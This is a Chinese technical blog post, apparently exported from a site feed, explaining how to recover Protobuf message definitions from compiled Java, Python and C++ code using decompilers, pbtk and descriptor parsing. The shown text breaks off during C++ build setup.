<p><a class="link"   href="https://chromium.googlesource.com/external/github.com/ARM-software/arm-trusted-firmware/+/v0.4-rc1/docs/firmware-design.md" >https://chromium.googlesource.com/external/github.com/ARM-software/arm-trusted-firmware/+/v0.4-rc1/docs/firmware-design.md<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/arnoldlu/p/14175126.html" >https://www.cnblogs.com/arnoldlu/p/14175126.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/391101179" >https://zhuanlan.zhihu.com/p/391101179<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://harmonyhu.com/2018/06/23/Arm-trusted-firmware/#bl1" >https://harmonyhu.com/2018/06/23/Arm-trusted-firmware/#bl1<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://android.googlesource.com/platform/external/lz4/+/HEAD/doc/lz4_Frame_format.md" >https://android.googlesource.com/platform/external/lz4/+/HEAD/doc/lz4_Frame_format.md<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>逆向恢复 Protobuf 对象结构</title>
    <url>/2023/12/14/protobuf/</url>
    <content><![CDATA[<p>一些在逆向过程中恢复 Google Protobuf 对象结构的方法。</p>
<span id="more"></span>

<h2 id="Protobuf"><a href="#Protobuf" class="headerlink" title="Protobuf"></a>Protobuf</h2><p>Protobuf 是 Google 推出的一款开源跨平台的序列化数据结构的协议，它在执行效率、兼容性等方面比较优秀，在 Google 内部以及很多大型项目中被广泛使用。</p>
<p>Protobuf 的基础是 proto 文件以及 protoc 编译器，开发者把想要进行序列化的对象定义成 <code>.proto</code> 文件，然后利用 protoc 编译成对应语言的代码，这样就可以在业务中使用代码提供的各项接口来操纵对象。关于 Protobuf 的基本使用可以参考 Google 官方文档。</p>
<p>Protobuf 灵活高效，在开发时可以很方便的使用，但从逆向角度来看，Protobuf 序列化之后的数据一般以二进制形式保存，例如我们定义如下 protobuf 对象</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">syntax = &quot;proto3&quot;; </span><br><span class="line"> </span><br><span class="line">message ExampleProtobuf</span><br><span class="line">&#123;</span><br><span class="line">    string name = 1;</span><br><span class="line">    int32 price = 2;</span><br><span class="line">    string location = 3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后实例化一个对象并将其序列化</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;apple&quot;,&quot;price&quot;:10,&quot;location&quot;:&quot;A-10&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>最终会得到结果(HEX 编码)</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0a 05 61 70 70 6c 65 10 0a 1a 04 41 2d 31 30</span><br></pre></td></tr></table></figure></div>

<p>结果中可以直观的看到我们定义的字符串数据，但数据类型和名称等信息已经丢失，针对更加复杂的对象则难以分析，需要某些方法从 protoc 生成的代码中恢复数据结构。本文我们会尝试从 JAVA、Python 以及 C++ 三种不同语言中恢复 Protobuf 对象的定义。</p>
<h2 id="JAVA-中的-Protobuf"><a href="#JAVA-中的-Protobuf" class="headerlink" title="JAVA 中的 Protobuf"></a>JAVA 中的 Protobuf</h2><p>以开源项目 <a class="link"   href="https://github.com/simplesteph/protobuf-example-java" >https://github.com/simplesteph/protobuf-example-java<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 为例，将项目克隆到本地，使用 IDEA 编译，然后找到生成的 jar 文件使用 jadx 反编译分析。</p>
<p>首先查看 SimpleMessage 的原始定义</p>
<div class="code-container" data-rel="Protobuf"><figure class="iseeu highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> example.simple;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">SimpleMessage</span> &#123;</span><br><span class="line">  <span class="type">int32</span> id = <span class="number">1</span>;</span><br><span class="line">  <span class="type">bool</span> is_simple = <span class="number">2</span>;</span><br><span class="line">  <span class="type">string</span> name = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">repeated</span> <span class="type">int32</span> sample_list = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>从定义可以看到它包含 4 个成员，其中 sample_list 比较特殊，是一个列表。</p>
<p>在 jadx 中找到 SimpleMessage 的定义，虽然对象经过 protoc 编译后得到的是比较复杂的源文件，但得益于 java 的反编译效果，我们基本上可以完全还原这份源码，查看反编译结果即可清晰的看到变量名以及它们的类型</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> GeneratedMessageV3.<span class="type">FieldAccessorTable</span> <span class="variable">internal_static_example_simple_SimpleMessage_fieldAccessorTable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GeneratedMessageV3</span>.FieldAccessorTable(internal_static_example_simple_SimpleMessage_descriptor, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Id&quot;</span>, <span class="string">&quot;IsSimple&quot;</span>, <span class="string">&quot;Name&quot;</span>, <span class="string">&quot;SampleList&quot;</span>&#125;);</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">SimpleMessage</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.id_ = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">this</span>.isSimple_ = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.name_ = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">this</span>.sampleListMemoizedSerializedSize = -<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">this</span>.memoizedIsInitialized = (<span class="type">byte</span>) -<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">this</span>.name_ = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">this</span>.sampleList_ = emptyIntList();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>仔细观察源文件还可以发现，其中存在这样的数据结构</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">        String[] descriptorData = &#123;<span class="string">&quot;\n\fsimple.proto\u0012\u000eexample.simple\&quot;Q\n\rSimpleMessage\u0012\n\n\u0002id\u0018\u0001 \u0001(\u0005\u0012\u0011\n\tis_simple\u0018\u0002 \u0001(\b\u0012\f\n\u0004name\u0018\u0003 \u0001(\t\u0012\u0013\n\u000bsample_list\u0018\u0004 \u0003(\u0005b\u0006proto3&quot;</span>&#125;;</span><br><span class="line">        descriptor = Descriptors.FileDescriptor.internalBuildGeneratedFileFrom(descriptorData, <span class="keyword">new</span> <span class="title class_">Descriptors</span>.FileDescriptor[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>descriptorData 是一个主要由二进制字符构成的字符串，查看资料得知它是用来表示消息类型的描述符，包含了消息类型的结构化信息，例如字段名称、类型、标签等。而理论上可以通过解析这个数据结构来还原部分对象的原始定义。</p>
<p><a class="link"   href="https://github.com/marin-m/pbtk" >开源工具<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>已经实现了这部分功能，例如使用工具中附带的 jar_extract.py 脚本处理 jar 文件</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 jar_extract.py protobuf-example-java-1.0-SNAPSHOT.jar extracted</span><br></pre></td></tr></table></figure></div>

<p>执行后会生成 4 个 proto 文件，其中 simple.proto 文件内容</p>
<div class="code-container" data-rel="Protobuf"><figure class="iseeu highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> example.simple;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">SimpleMessage</span> &#123;</span><br><span class="line">  <span class="type">int32</span> id = <span class="number">1</span>;</span><br><span class="line">  <span class="type">bool</span> is_simple = <span class="number">2</span>;</span><br><span class="line">  <span class="type">string</span> name = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">repeated</span> <span class="type">int32</span> sample_list = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>结果和原始定义完全一致。</p>
<p>protobuf 支持对编译开启优化选项，共有三种优化级别，SPEED、CODE_SIZE、LITE_RUNTIME，默认情况下，采用的是 SPEED 模式，此时生成的代码执行效率高，但是占用空间更大，CODE_SIZE 模式占用空间小，但是执行效率更低，LITE_RUNTIME 牺牲了 protobuf 提供的反射功能从而兼顾执行效率和代码占用空间。</p>
<p>当采用 LITE_RUNTIME 模式编译时，最终生成的源代码中将不再包含 descriptorData 数据，也就不能使用 pbtk 自动还原对象结构。</p>
<p>我们以某 Android APP 为例来分析一下如何还原缺少描述信息的 protobuf 结构。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">GetPeerInfoRequest</span> <span class="keyword">extends</span> <span class="title class_">GeneratedMessageLite</span>&lt;GetPeerInfoRequest, b&gt; <span class="keyword">implements</span> <span class="title class_">MessageLiteOrBuilder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">BITRATE_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> GetPeerInfoRequest DEFAULT_INSTANCE;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DEVICE_ID_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">EPISODE_ID_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">LIVE_SEGMENT_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">13</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MANUSCRIPT_TYPE_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">NAT_TYPE_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Parser&lt;GetPeerInfoRequest&gt; PARSER = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PEER_NEED_COUNT_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PLAY_TYPE_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">RESOURCE_AVID_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">RESOURCE_ID_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">RESOURCE_SIZE_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">RESOURCE_TYPE_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">RESOURCE_URL_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SEASON_ID_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SEGMENT_ID_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SESSION_ID_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SUB_SEGMENT_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">TRANS_ID_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">19</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">UPLOAD_PRIORITY_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">21</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">UPLOAD_UTC_TIMESTAMP_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">17</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">UP_MID_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> bitrate_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> episodeId_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> liveSegment_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> manuscriptType_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> natType_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> peerNeedCount_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> playType_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> resourceSize_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> resourceType_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> seasonId_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> segmentId_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> sessionId_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> upMid_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> uploadPriority_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> uploadUtcTimestamp_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">subSegmentMemoizedSerializedSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">deviceId_</span> <span class="operator">=</span> com.redacted.nativelibrary.b.d;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">resourceId_</span> <span class="operator">=</span> com.redacted.nativelibrary.b.d;</span><br><span class="line">    <span class="keyword">private</span> Internal.<span class="type">IntList</span> <span class="variable">subSegment_</span> <span class="operator">=</span> GeneratedMessageLite.emptyIntList();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">resourceAvid_</span> <span class="operator">=</span> com.redacted.nativelibrary.b.d;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">resourceUrl_</span> <span class="operator">=</span> com.redacted.nativelibrary.b.d;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">transId_</span> <span class="operator">=</span> com.redacted.nativelibrary.b.d;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这是一个叫做 GetPeerInfoRequest 的类，继承自 GeneratedMessageLite 类，实现了 MessageLiteOrBuilder 接口，MessageLite 是 protobuf 中提供的类，它不支持反射机制，因此也不包含描述信息。</p>
<p>观察这个类，发现存在大量 xxx_FIELD_NUMBER 的成员，另外还可以找到叫做 dynamicMethod 的函数</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Object <span class="title function_">dynamicMethod</span><span class="params">(GeneratedMessageLite.MethodToInvoke methodToInvoke, Object obj, Object obj2)</span> &#123;</span><br><span class="line">       <span class="keyword">switch</span> (a.a[methodToInvoke.ordinal()]) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">GetPeerInfoRequest</span>();</span><br><span class="line">           <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">b</span>(<span class="literal">null</span>);</span><br><span class="line">           <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">               <span class="keyword">return</span> GeneratedMessageLite.newMessageInfo(DEFAULT_INSTANCE, <span class="string">&quot;\u0000\u0015\u0000\u0000\u0001\u0015\u0015\u0000\u0001\u0000\u0001Ȉ\u0002Ȉ\u0003\f\u0004\u0002\u0005\u0004\u0006\u0004\u0007&#x27;\b\u0004\tȈ\n\f\u000b\f\fȈ\r\u0004\u000e\u0002\u000f\u0002\u0010\u0002\u0011\u0002\u0012\f\u0013Ȉ\u0014\u0004\u0015\f&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;deviceId_&quot;</span>, <span class="string">&quot;resourceId_&quot;</span>, <span class="string">&quot;resourceType_&quot;</span>, <span class="string">&quot;resourceSize_&quot;</span>, <span class="string">&quot;sessionId_&quot;</span>, <span class="string">&quot;bitrate_&quot;</span>, <span class="string">&quot;subSegment_&quot;</span>, <span class="string">&quot;segmentId_&quot;</span>, <span class="string">&quot;resourceAvid_&quot;</span>, <span class="string">&quot;playType_&quot;</span>, <span class="string">&quot;natType_&quot;</span>, <span class="string">&quot;resourceUrl_&quot;</span>, <span class="string">&quot;liveSegment_&quot;</span>, <span class="string">&quot;seasonId_&quot;</span>, <span class="string">&quot;episodeId_&quot;</span>, <span class="string">&quot;upMid_&quot;</span>, <span class="string">&quot;uploadUtcTimestamp_&quot;</span>, <span class="string">&quot;manuscriptType_&quot;</span>, <span class="string">&quot;transId_&quot;</span>, <span class="string">&quot;peerNeedCount_&quot;</span>, <span class="string">&quot;uploadPriority_&quot;</span>&#125;);</span><br><span class="line">           <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">               <span class="keyword">return</span> DEFAULT_INSTANCE;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">               GeneratedMessageLite.<span class="type">DefaultInstanceBasedParser</span> <span class="variable">defaultInstanceBasedParser</span> <span class="operator">=</span> PARSER;</span><br><span class="line">               <span class="keyword">if</span> (defaultInstanceBasedParser == <span class="literal">null</span>) &#123;</span><br><span class="line">                   <span class="keyword">synchronized</span> (GetPeerInfoRequest.class) &#123;</span><br><span class="line">                       defaultInstanceBasedParser = PARSER;</span><br><span class="line">                       <span class="keyword">if</span> (defaultInstanceBasedParser == <span class="literal">null</span>) &#123;</span><br><span class="line">                           defaultInstanceBasedParser = <span class="keyword">new</span> <span class="title class_">GeneratedMessageLite</span>.DefaultInstanceBasedParser(DEFAULT_INSTANCE);</span><br><span class="line">                           PARSER = defaultInstanceBasedParser;</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">return</span> defaultInstanceBasedParser;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">               <span class="keyword">return</span> (<span class="type">byte</span>) <span class="number">1</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">           <span class="keyword">default</span>:</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>函数中调用 GeneratedMessageLite.newMessageInfo 的位置包含一个字符串数组，其中元素就是原始对象定义的各个变量名。</p>
<p>以 <code>deviceId_</code> 为例，在类成员中找到 <code>DEVICE_ID_FIELD_NUMBER = 1</code>，说明在原始定义中存在一个叫做 deviceId 的变量，它对应编号为 1，接着找到 <code>private String deviceId_ = com.redacted.nativelibrary.b.d;</code>，说明 deviceId 变量应该是一个 string 类型。</p>
<p>这样就推测出原始 proto 对象肯定存在这样一条定义：<code>string deviceId = 1;</code></p>
<p>按照这种模式将所有变量进行还原，由于数据具有较高的结构化程度，我们可以尝试利用 AI 实现自动化还原。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">现在有一个经过 protoc 编译得到的 java 文件，请根据以下信息还原 proto 对象定义</span><br><span class="line">&lt;附加以上代码&gt;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Protobuf"><figure class="iseeu highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">GetPeerInfoRequest</span> &#123;</span><br><span class="line">  <span class="type">string</span> device_id = <span class="number">1</span>;</span><br><span class="line">  <span class="type">string</span> resource_id = <span class="number">2</span>;</span><br><span class="line">  <span class="type">int32</span> resource_type = <span class="number">3</span>;</span><br><span class="line">  <span class="type">int64</span> resource_size = <span class="number">4</span>;</span><br><span class="line">  <span class="type">int32</span> session_id = <span class="number">5</span>;</span><br><span class="line">  <span class="type">int32</span> bitrate = <span class="number">6</span>;</span><br><span class="line">  <span class="keyword">repeated</span> <span class="type">int32</span> sub_segment = <span class="number">7</span>;</span><br><span class="line">  <span class="type">int32</span> segment_id = <span class="number">8</span>;</span><br><span class="line">  <span class="type">string</span> resource_avid = <span class="number">9</span>;</span><br><span class="line">  <span class="type">int32</span> play_type = <span class="number">10</span>;</span><br><span class="line">  <span class="type">int32</span> nat_type = <span class="number">11</span>;</span><br><span class="line">  <span class="type">string</span> resource_url = <span class="number">12</span>;</span><br><span class="line">  <span class="type">int32</span> live_segment = <span class="number">13</span>;</span><br><span class="line">  <span class="type">int64</span> season_id = <span class="number">14</span>;</span><br><span class="line">  <span class="type">int64</span> episode_id = <span class="number">15</span>;</span><br><span class="line">  <span class="type">int64</span> up_mid = <span class="number">16</span>;</span><br><span class="line">  <span class="type">int64</span> upload_utc_timestamp = <span class="number">17</span>;</span><br><span class="line">  <span class="type">int32</span> manuscript_type = <span class="number">18</span>;</span><br><span class="line">  <span class="type">string</span> trans_id = <span class="number">19</span>;</span><br><span class="line">  <span class="type">int32</span> peer_need_count = <span class="number">20</span>;</span><br><span class="line">  <span class="type">int32</span> upload_priority = <span class="number">21</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最终结果可能和代码存在误差，不过大部分结构已经成功恢复。</p>
<h2 id="Python-中的-Protobuf"><a href="#Python-中的-Protobuf" class="headerlink" title="Python 中的 Protobuf"></a>Python 中的 Protobuf</h2><p>还是以 SimpleMessage 为例，使用 protoc 编译后得到的文件则非常简单</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span></span><br><span class="line"><span class="comment"># source: simple.proto</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Generated protocol buffer code.&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> google.protobuf.internal <span class="keyword">import</span> builder <span class="keyword">as</span> _builder</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> descriptor <span class="keyword">as</span> _descriptor</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> descriptor_pool <span class="keyword">as</span> _descriptor_pool</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> symbol_database <span class="keyword">as</span> _symbol_database</span><br><span class="line"><span class="comment"># @@protoc_insertion_point(imports)</span></span><br><span class="line"></span><br><span class="line">_sym_db = _symbol_database.Default()</span><br><span class="line"></span><br><span class="line">DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(<span class="string">b&#x27;\n\x0csimple.proto\x12\x0e\x65xample.simple\&quot;Q\n\rSimpleMessage\x12\n\n\x02id\x18\x01 \x01(\x05\x12\x11\n\tis_simple\x18\x02 \x01(\x08\x12\x0c\n\x04name\x18\x03 \x01(\t\x12\x13\n\x0bsample_list\x18\x04 \x03(\x05\x62\x06proto3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, <span class="built_in">globals</span>())</span><br><span class="line">_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, <span class="string">&#x27;simple_pb2&#x27;</span>, <span class="built_in">globals</span>())</span><br><span class="line"><span class="keyword">if</span> _descriptor._USE_C_DESCRIPTORS == <span class="literal">False</span>:</span><br><span class="line"></span><br><span class="line">  DESCRIPTOR._options = <span class="literal">None</span></span><br><span class="line">  _SIMPLEMESSAGE._serialized_start=<span class="number">32</span></span><br><span class="line">  _SIMPLEMESSAGE._serialized_end=<span class="number">113</span></span><br><span class="line"><span class="comment"># @@protoc_insertion_point(module_scope)</span></span><br></pre></td></tr></table></figure></div>

<p>可以编写以下代码将描述信息进行解码</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> google.protobuf.descriptor_pb2 <span class="keyword">import</span> FileDescriptorProto</span><br><span class="line"></span><br><span class="line">proto = FileDescriptorProto()</span><br><span class="line">proto.ParseFromString(<span class="string">b&#x27;\n\x0csimple.proto\x12\x0e\x65xample.simple\&quot;Q\n\rSimpleMessage\x12\n\n\x02id\x18\x01 \x01(\x05\x12\x11\n\tis_simple\x18\x02 \x01(\x08\x12\x0c\n\x04name\x18\x03 \x01(\t\x12\x13\n\x0bsample_list\x18\x04 \x03(\x05\x62\x06proto3&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(proto)</span><br></pre></td></tr></table></figure></div>

<p>由于 Python 的特性，在一定版本范围内可以直接通过工具反编译得到源代码，且经过测试发现是否指定 LITE_RUNTIME 模式似乎对生成的结果无影响，都能通过解析描述信息来还原原始结构。</p>
<h2 id="C-中的-Protobuf"><a href="#C-中的-Protobuf" class="headerlink" title="C++ 中的 Protobuf"></a>C++ 中的 Protobuf</h2><p>首先搭建一个编译环境用来生成测试程序，以下操作在 Windows 中进行。</p>
<h3 id="搭建编译环境"><a href="#搭建编译环境" class="headerlink" title="搭建编译环境"></a>搭建编译环境</h3><p>系统要安装 Visual Studio、Cmake、git 工具，下载 <a class="link"   href="https://github.com/protocolbuffers/protobuf/releases" >protobuf 源代码<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，选择 Source Code 下载到本地并解压，然后打开刚刚解压出来的目录，在里面创建一个 build 文件夹，在 build 文件夹中新建一个 output 文件夹。<br>进入 third_party&#x2F;abseil-cpp 目录，打开终端，执行命令</p>
<div class="code-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/abseil/abseil<span class="literal">-cpp</span></span><br></pre></td></tr></table></figure></div>
<p>等待克隆完毕之后，把 abseil-cpp 目录下的内容复制到外层目录。</p>
<p>打开 Cmake GUI，源代码路径选择 protobuf 根目录，输出路径选择刚刚创建的 build 文件夹，然后点击 Configure</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/protobuf-1.png"
                     
                ></p>
